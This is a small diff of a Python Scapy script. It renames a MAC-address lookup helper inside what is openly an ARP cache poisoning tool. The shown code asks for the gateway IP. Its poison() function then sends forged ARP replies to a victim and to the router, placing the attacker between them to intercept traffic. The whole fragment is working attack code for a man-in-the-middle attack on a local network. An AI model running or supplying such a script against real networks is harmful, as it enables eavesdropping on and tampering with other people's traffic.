@@ -23,15 +23,15 @@ def information () :
 	iprouteur = raw_input("IP du routeur GW :")
 
 
-def mac_victime(ip):
+def get_mac(ip):
     ans, unans = arping(ip)
     for s, r in ans:
         return r[Ether].src
 
 
 def poison(iprouteur, ipvictime):
-    victimMAC = mac_victime(ipvictime)
-    routerMAC = mac_victime(iprouteur)
+    victimMAC = get_mac(ipvictime)
+    routerMAC = get_mac(iprouteur)
     send(ARP(op =2, pdst = ipvictime, psrc = iprouteur, hwdst = victimMAC))
     send(ARP(op = 2, pdst = iprouteur, psrc = ipvictime, hwdst = routerMAC))
 
